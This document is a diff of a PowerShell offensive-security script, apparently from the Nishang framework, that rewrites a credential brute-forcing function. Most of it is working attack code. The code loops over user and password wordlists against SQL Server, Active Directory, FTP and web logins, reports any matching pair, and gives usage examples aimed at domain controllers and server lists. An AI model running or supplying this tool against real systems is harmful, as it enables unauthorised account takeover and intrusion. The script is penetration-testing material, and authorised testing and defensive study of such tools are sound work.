@@ -1514,42 +1514,43 @@ https://github.com/samratashok/nishang
 ################################Performs a Brute-Force Attack against SQL Server, Active Directory, Web and FTP.###########################
 ####Thanks Niklas Goude#####
 ###http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/03/use-powershell-to-security-test-sql-server-and-sharepoint.aspx
-function Brute-Force {
 
-<#
+function Invoke-BruteForce 
+{
+  <#
 .SYNOPSIS
-Payload which performs a Brute-Force Attack against SQL Server, Active Directory, Web and FTP.
+Nishang payload which performs a Brute-Force Attack against SQL Server, Active Directory, Web and FTP.
 
 .DESCRIPTION
-This payload tries to login to SQL, ActiveDirectory, Web or FTP using a specific account and password.
-You can also specify a password-list as input as shown in the Example section.
+This payload can brute force credentials for SQL Server, ActiveDirectory, Web or FTP.
 
-.PARAMETER Identity
-Specifies a SQL Server, FTP Site or Web Site.
+.PARAMETER Computername
+Specifies a SQL Server, Domain, FTP Site or Web Site.
 
-.PARAMETER UserName
-Specifies a UserName. If blank, trusted connection will be used for SQL and anonymous access will be used for FTP.
+.PARAMETER UserList
+Specify a list of users. If blank, trusted connection will be used for SQL and an error will be genrated for other services.
 
-.PARAMETER Password
-Specifies a Password.
+.PARAMETER PasswordList
+Specify a list of passwords.
 
 .PARAMETER Service
-Enter a Service. Default service is set to SQL.
+Enter a Service from SQL, ActiveDirecotry, FTP and Web. Default service is set to SQL.
+
+.PARAMETER StopOnSuccess
+Use this switch to stop the brute forcing on the first success.
 
 .EXAMPLE
-PS> Brute-Force -Identity SRV01 -UserName sa -Password ""
+PS > Invoke-BruteForce -ComputerName SQLServ01 -UserList C:\test\users.txt -PasswordList C:\test\wordlist.txt -Service SQL -Verbose
+Brute force a SQL Server SQLServ01 for users listed in users.txt and passwords in wordlist.txt
 
 .EXAMPLE
-PS> Brute-Force -Identity ftp://SRV01 -UserName sa -Password "" -Service FTP
+PS > Invoke-BruteForce -ComputerName targetdomain.com -UserList C:\test\users.txt -PasswordList C:\test\wordlist.txt -Service ActiveDirectory -StopOnSuccess -Verbose
+Brute force a Domain Controller of targetdomain.com for users listed in users.txt and passwords in wordlist.txt.
+Since StopOnSuccess is specified, the brute forcing stops on first success.
 
 .EXAMPLE
-PS> "SRV01","SRV02","SRV03" | Brute-Force -UserName sa -Password sa
-
-.EXAMPLE
-PS> Brute-Force -Identity "domain.local" -UserName administrator -Password Password1 -Service ActiveDirectory
-
-.EXAMPLE
-PS> Brute-Force -Identity "http://www.something.com" -UserName user001 -Password Password1 -Service Web
+PS > cat C:\test\servers.txt | Invoke-BruteForce -UserList C:\test\users.txt -PasswordList C:\test\wordlist.txt -Service SQL -Verbose
+Brute force SQL Service on all the servers specified in servers.txt
 
 .LINK
 http://www.truesec.com
@@ -1559,122 +1560,219 @@ https://github.com/samratashok/nishang
 .NOTES
 Goude 2012, TreuSec
 #>
+    [CmdletBinding()] Param(
+        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeline=$true)]
+        [Alias("PSComputerName","CN","MachineName","IP","IPAddress","Identity","Url","Ftp","Domain","DistinguishedName")]
+        [String]
+        $ComputerName,
 
-  Param(
-    [Parameter(Mandatory = $true,
-      Position = 0,
-      ValueFromPipeLineByPropertyName = $true)]
-    [Alias("PSComputerName","CN","MachineName","IP","IPAddress","ComputerName","Url","Ftp","Domain","DistinguishedName")]
-    [string]$Identity,
+        [Parameter(Position = 1, Mandatory = $false)]
+        [String]
+        $UserList,
 
-    [parameter(Position = 1,
-      ValueFromPipeLineByPropertyName = $true)]
-    [string]$UserName,
+        [Parameter(Position = 2, Mandatory = $false)]
+        [String]
+        $PasswordList,
 
-    [parameter(Position = 2,
-      ValueFromPipeLineByPropertyName = $true)]
-    [string]$Password,
+        [Parameter(Position = 3, Mandatory = $false)] [ValidateSet("SQL","FTP","ActiveDirectory","Web")]
+        [String]
+        $Service = "SQL",
 
-    [parameter(Position = 3)]
-    [ValidateSet("SQL","FTP","ActiveDirectory","Web")]
-    [string]$Service = "SQL"
-  )
-  
-  Process {
-    if($service -eq "SQL") {
-      $Connection = New-Object System.Data.SQLClient.SQLConnection
-      if($userName) {
-        $Connection.ConnectionString = "Data Source=$identity;Initial Catalog=Master;User Id=$userName;Password=$password;"
-      } else {
-        $Connection.ConnectionString = "server=$identity;Initial Catalog=Master;trusted_connection=true;"
-      }
-      Try {
-        $Connection.Open()
-        $success = $true
-      }
-      Catch {
-        $success = $false
-      }
-      if($success -eq $true) {
-        $message = switch($connection.ServerVersion) {
-          { $_ -match "^6" } { "SQL Server 6.5";Break }
-          { $_ -match "^6" } { "SQL Server 7";Break }
-          { $_ -match "^8" } { "SQL Server 2000";Break }
-          { $_ -match "^9" } { "SQL Server 2005";Break }
-          { $_ -match "^10\.00" } { "SQL Server 2008";Break }
-          { $_ -match "^10\.50" } { "SQL Server 2008 R2";Break }
-          Default { "Unknown" }
+        [Parameter(Position = 4, Mandatory = $false)]
+        [Switch]
+        $StopOnSuccess
+    )
+
+    Process 
+    {
+        $usernames = Get-Content $UserList
+        $passwords = Get-Content $PasswordList
+        #Brute force SQL Server
+        $Connection = New-Object System.Data.SQLClient.SQLConnection
+        function CheckForSQLSuccess
+        {
+            Try
+            {
+                $Connection.Open()
+                $success = $true
+            }
+            Catch
+            {
+                $success = $false
+            }
+            if($success -eq $true) 
+            {
+                Write-Output "Match found! $username : $Password"
+                switch ($connection.ServerVersion) {
+                    { $_ -match "^6" } { "SQL Server 6.5";Break UsernameLoop }
+                    { $_ -match "^6" } { "SQL Server 7";Break UsernameLoop }
+                    { $_ -match "^8" } { "SQL Server 2000";Break UsernameLoop }
+                    { $_ -match "^9" } { "SQL Server 2005";Break UsernameLoop }
+                    { $_ -match "^10\.00" } { "SQL Server 2008";Break UsernameLoop }
+                    { $_ -match "^10\.50" } { "SQL Server 2008 R2";Break UsernameLoop }
+                    { $_ -match "^11" } { "SQL Server 2012";Break UsernameLoop }
+                    { $_ -match "^12" } { "SQL Server 2014";Break UsernameLoop }
+                    Default { "Unknown" }
+                }
+            } 
         }
-      } else {
-        $message = "Unknown"
-      }
-    } elseif($service -eq "FTP") {
-      if($identity -notMatch "^ftp://") {
-        $source = "ftp://" + $identity
-      } else {
-        $source = $identity
-      }
-      try {
-        $ftpRequest = [System.Net.FtpWebRequest]::Create($source)
-        $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::ListDirectoryDetails
-        $ftpRequest.Credentials = new-object System.Net.NetworkCredential($userName, $password)
-        $result = $ftpRequest.GetResponse()
-        $message = $result.BannerMessage + $result.WelcomeMessage
-        $success = $true
-      } catch {
-        $message = $error[0].ToString()
-        $success = $false
-      }
-    } elseif($service -eq "ActiveDirectory") {
-      Add-Type -AssemblyName System.DirectoryServices.AccountManagement
-      $contextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
-      Try {
-        $principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($contextType, $identity)
-        $success = $true
-      }
-      Catch {
-        $message = "Unable to contact Domain"
-        $success = $false
-      }
-      if($success -ne $false) {
-        Try {
-          $success = $principalContext.ValidateCredentials($username, $password)
-          $message = "Password Match"
+        if($service -eq "SQL") 
+        {
+            Write-Output "Brute Forcing SQL Service on $ComputerName"
+            if($userList) 
+            {
+                :UsernameLoop foreach ($username in $usernames)
+                {
+                    foreach ($Password in $Passwords)
+                    {
+                        $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;User Id=$userName;Password=$password;"
+                        Write-Verbose "Checking $userName : $password"
+                        CheckForSQLSuccess
+                    }
+                }
+            } 
+            else 
+            {
+                #If no username is provided, use trusted connection
+                $Connection.ConnectionString = "server=$identity;Initial Catalog=Master;trusted_connection=true;"
+                CheckForSQLSuccess
+
+            }
+        } 
+
+        #Brute Force FTP
+        elseif ($service -eq "FTP")
+        {
+            if($ComputerName -notMatch "^ftp://") 
+            {
+                $source = "ftp://" + $ComputerName
+            }
+            else 
+            {
+                $source = $ComputerName
+            }
+            Write-Output "Brute Forcing FTP on $ComputerName"
+
+            :UsernameLoop foreach ($username in $usernames)
+            {
+                foreach ($Password in $Passwords)
+                {
+                    try 
+                    {
+                        $ftpRequest = [System.Net.FtpWebRequest]::Create($source)
+                        $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::ListDirectoryDetails
+                        Write-Verbose "Checking $userName : $password"
+                        $ftpRequest.Credentials = new-object System.Net.NetworkCredential($userName, $password)
+                        $result = $ftpRequest.GetResponse()
+                        $message = $result.BannerMessage + $result.WelcomeMessage
+                        Write-Output "Match found! $username : $Password"
+                        $success = $true
+                        if ($StopOnSuccess)
+                        {
+                            break UsernameLoop
+                        }
+                    }
+
+                    catch 
+                    {
+                        $message = $error[0].ToString()
+                        $success = $false
+                    }
+                }
+            } 
         }
-        Catch {
-          $success = $false
-          $message = "Password doesn't match"
+
+        #Brute Force Active Directory
+        elseif ($service -eq "ActiveDirectory") 
+        {
+            Write-Output "Brute Forcing Active Directory $ComputerName"
+            Add-Type -AssemblyName System.DirectoryServices.AccountManagement
+            $contextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
+            Try 
+            {
+                $principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($contextType, $ComputerName)
+                $success = $true
+            }
+            Catch 
+            {
+                $message = "Unable to contact Domain"
+                $success = $false
+            }
+            if($success -ne $false) 
+            {
+                :UsernameLoop foreach ($username in $usernames)
+                {
+                    foreach ($Password in $Passwords)
+                    {
+                        Try 
+                        {
+                            Write-Verbose "Checking $userName : $password"
+                            $success = $principalContext.ValidateCredentials($username, $password)
+                            $message = "Password Match"
+                            if ($success -eq $true)
+                            {
+                                Write-Output "Match found! $username : $Password"                        
+                                if ($StopOnSuccess)
+                                {
+                                    break UsernameLoop
+                                }
+                            }
+                        }
+                        Catch 
+                        {
+                            $success = $false
+                            $message = "Password doesn't match"
+                        }
+                    }
+                }
+            }
         }
-      }
-    } elseif($service -eq "Web") {
-      if($identity -notMatch "^(http|https)://") {
-        $source = "http://" + $identity
-      } else {
-        $source = $identity
-      }
-      $webClient = New-Object Net.WebClient
-      $securePassword = ConvertTo-SecureString -AsPlainText -String $password -Force
-      $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $userName, $securePassword
-      $webClient.Credentials = $credential
-      Try {
-        $message = $webClient.DownloadString($source)
-        $success = $true
-      }
-      Catch {
-        $success = $false
-        $message = "Password doesn't match"
-      }
+        #Brute Force Web
+        elseif ($service -eq "Web") 
+        {
+            if ($ComputerName -notMatch "^(http|https)://")
+            {
+                $source = "http://" + $ComputerName
+            } 
+            else 
+            {
+                $source = $ComputerName
+            }
+            :UsernameLoop foreach ($username in $usernames)
+            {
+                foreach ($Password in $Passwords)
+                {
+                    $webClient = New-Object Net.WebClient
+                    $securePassword = ConvertTo-SecureString -AsPlainText -String $password -Force
+                    $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $userName, $securePassword
+                    $webClient.Credentials = $credential
+                    Try 
+                    {
+                        Write-Verbose "Checking $userName : $password"
+                        $source
+                        $webClient.DownloadString($source)
+                        $success = $true
+                        $success
+                        if ($success -eq $true)
+                        {
+                            Write-Output "Match found! $Username : $Password"                        
+                            if ($StopOnSuccess)
+                            {
+                                break UsernameLoop
+                            }
+                        }
+                    }
+                    Catch 
+                    {
+                        $success = $false
+                        $message = "Password doesn't match"
+                    }
+                }
+            }
+        }
     }
-    # Return Object
-    New-Object PSObject -Property @{
-      ComputerName = $identity;
-      UserName = $username;
-      Password = $Password;
-      Success = $success;
-      Message = $message
-    } | Select-Object Success, Message, UserName, Password, ComputerName
-  }
 }
+
 
 
 #########################################Scan IP-Addresses, Ports and HostNames############################################################
